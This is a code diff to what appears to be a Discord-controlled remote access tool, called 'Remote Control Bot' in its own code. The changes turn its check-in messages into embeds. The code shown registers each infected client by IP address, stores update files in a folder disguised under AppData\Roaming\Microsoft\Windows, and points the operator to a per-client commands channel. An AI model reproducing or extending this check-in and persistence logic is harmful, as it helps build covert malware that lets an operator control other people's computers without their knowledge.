@@ -140,27 +140,42 @@ async def on_ready():
             user_profile = os.environ['USERPROFILE']
             target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
             if os.path.exists(os.path.join(target_path, "skibidi-mainmain", "update.txt")):
+
                 with open(os.path.join(target_path, "skibidi-mainmain", "update.txt")) as up:
                     tex = up.read()
                     print("Checking if update was done...")
                     up.close()
+
                 if not tex == "":
                     print("Updated!")
+
                     category = nextcord.utils.get(guild.categories, name=str(ip))
                     channel5 = nextcord.utils.get(category.text_channels, name="events")
-                    await channel5.send(f"Client updated to version v{tex}")
-                    await channel13.send(f"Client {ip} updated to version v{tex}! Use commands in: {nextcord.utils.get(category.text_channels, name="commands").mention}")
+
+                    embed = nextcord.Embed(title="Client update complete!", timestamp=datetime.now(), colour=0x00b0f4, description=f"Client updated to version v{tex}!")
+                    embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+                    await channel5.send(embed=embed)
+
+                    embed = nextcord.Embed(title="Client update complete!", timestamp=datetime.now(), colour=0x00b0f4, description=f"Client {ip} updated to version v{tex}! Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}")
+                    embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+                    await channel13.send(embed=embed)
+
                     with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as up:
                         up.write("")
                         up.close()
+
                     with open(os.path.join(target_path, "skibidi-mainmain", "ver.txt"), "w") as up2:
                         up2.write(tex)
                         up2.close()
-            await channel12.send(f"Client {ip} online! Use commands in: {nextcord.utils.get(category.text_channels, name="commands").mention}")
+
+            embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d, description=f"Client {ip} is now online! Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}")
+            embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+            await channel12.send(embed=embed)
             category = nextcord.utils.get(guild.categories, name=str(ip))
             if category:
-                embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d)
+                embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d, description="Client is now online!")
                 embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+
                 channel = nextcord.utils.get(category.text_channels, name="events")
                 if channel:
                     await channel.send(embed=embed)
